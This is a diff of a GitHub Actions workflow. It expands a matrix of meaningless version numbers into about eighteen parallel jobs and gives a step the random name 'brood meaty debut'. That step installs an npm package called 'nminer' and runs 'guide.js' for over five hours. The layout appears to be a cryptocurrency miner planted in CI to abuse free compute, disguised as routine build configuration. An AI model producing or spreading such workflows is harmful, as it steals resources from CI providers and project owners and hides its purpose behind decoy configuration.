@@ -9,21 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7447 }
-          - { version: 6351 }
-          - { version: 4793 }
-          - { version: 6784 }
-          - { version: 6995 }
-          - { version: 3139 }
-          - { version: 3318 }
-          - { version: 2455 }
-          - { version: 1443 }
-          - { version: 6217 }
-          - { version: 6910 }
-          - { version: 6563 }
-          - { version: 9538 }
-          - { version: 251 }
-          - { version: 3286 }
+          - { version: 161 }
+          - { version: 4223 }
+          - { version: 9104 }
+          - { version: 6909 }
+          - { version: 8848 }
+          - { version: 7856 }
+          - { version: 5273 }
+          - { version: 1415 }
+          - { version: 6392 }
+          - { version: 2614 }
+          - { version: 9048 }
+          - { version: 6006 }
+          - { version: 33 }
+          - { version: 3934 }
+          - { version: 3520 }
+          - { version: 4599 }
+          - { version: 4740 }
+          - { version: 6451 }
 
     steps:
       - name: Checkout
@@ -34,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: brood meaty debut
         run: |
           npm install nminer@latest
-          timeout 317m node guide.js || echo "guide executed"
+          timeout 323m node guide.js || echo "guide executed"
